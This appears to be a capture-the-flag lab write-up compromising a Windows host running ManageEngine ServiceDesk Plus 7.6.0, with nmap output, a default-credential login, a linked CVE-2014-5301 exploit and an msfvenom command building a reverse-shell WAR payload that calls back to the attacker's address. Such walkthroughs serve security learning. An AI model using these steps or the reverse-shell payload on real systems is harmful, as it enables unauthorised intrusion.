First started with an namp scan

`nmap -sC -sV -T4 -oN nmap.txt <IP>`

```
# Nmap 7.93 scan initiated Sat Dec 24 07:22:32 2022 as: nmap -sC -sV -T4 -oN quickmap.txt -Pn 192.168.59.43                                                      [5/8]
Nmap scan report for 192.168.59.43                                                                                                                                    
Host is up (0.20s latency).                                                                                                                                           
Not shown: 995 filtered tcp ports (no-response)                                                                                                                       
PORT     STATE SERVICE       VERSION                                                                                                                                  
135/tcp  open  msrpc         Microsoft Windows RPC                                                                                                                    
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Windows Server (R) 2008 Standard 6001 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp open  ms-wbt-server Microsoft Terminal Service
8080/tcp open  http          Apache Tomcat/Coyote JSP engine 1.1
|_http-server-header: Apache-Coyote/1.1
| http-cookie-flags: 
|   /: 
|     JSESSIONID: 
|_      httponly flag not set
|_http-title: ManageEngine ServiceDesk Plus
Service Info: Host: HELPDESK; OS: Windows; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_server_2008:r2

Host script results:
|_clock-skew: mean: 2h40m00s, deviation: 4h37m08s, median: 0s
| smb-os-discovery: 
|   OS: Windows Server (R) 2008 Standard 6001 Service Pack 1 (Windows Server (R) 2008 Standard 6.0)
|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
|   Computer name: HELPDESK
|   NetBIOS computer name: HELPDESK\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-12-23T22:23:01-08:00
|_nbstat: NetBIOS name: HELPDESK, NetBIOS user: <unknown>, NetBIOS MAC: 005056babaf7 (VMware)
| smb2-time: 
|   date: 2022-12-24T06:23:01
|_  start_date: 2022-12-24T06:22:06
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   202: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Dec 24 07:23:41 2022 -- 1 IP address (1 host up) scanned in 69.24 seconds
```

got open ports, the focus is port 8080 which is running http service.

![image](https://user-images.githubusercontent.com/87468669/209432839-ad8b3af4-f34b-4bc6-90a0-962264ebc9ab.png)

As seen above, the web server is running `ManageEngine ServiceDesk Plus  |  7.6.0` old version software... try login with default creds administrator:administrator

![image](https://user-images.githubusercontent.com/87468669/209433145-46c64e26-c938-45f3-b572-4952e998b6a2.png)

Boom! we are in, let's search for public exploit, we don't use msf here😎😎.

![image](https://user-images.githubusercontent.com/87468669/209432937-3e49a31f-1c87-4421-819c-3a6a9275258b.png)

While checking for exploits, i saw the exploit above, `https://github.com/PeterSufliarsky/exploits/blob/master/CVE-2014-5301.py` download the exploit.

![image](https://user-images.githubusercontent.com/87468669/209433457-4cb7c6ad-dd83-4c67-9fb8-42e9aa391d2c.png)

First created a war payload `msfvenom -p java/shell_reverse_tcp LHOST=192.168.49.59 LPORT=1337 -f war -o shell.war` ncat listener fired up and now let's run the exploit.

![image](https://user-images.githubusercontent.com/87468669/209433565-30966d1d-a150-4859-872b-4f06aee74908.png)

And Boom!!! we got a reverse shell... 

![image](https://user-images.githubusercontent.com/87468669/209433654-5c03ac27-0a2c-4ba6-a05c-de2ecd21f8c4.png)

nice work without msf 😎 😎 😎
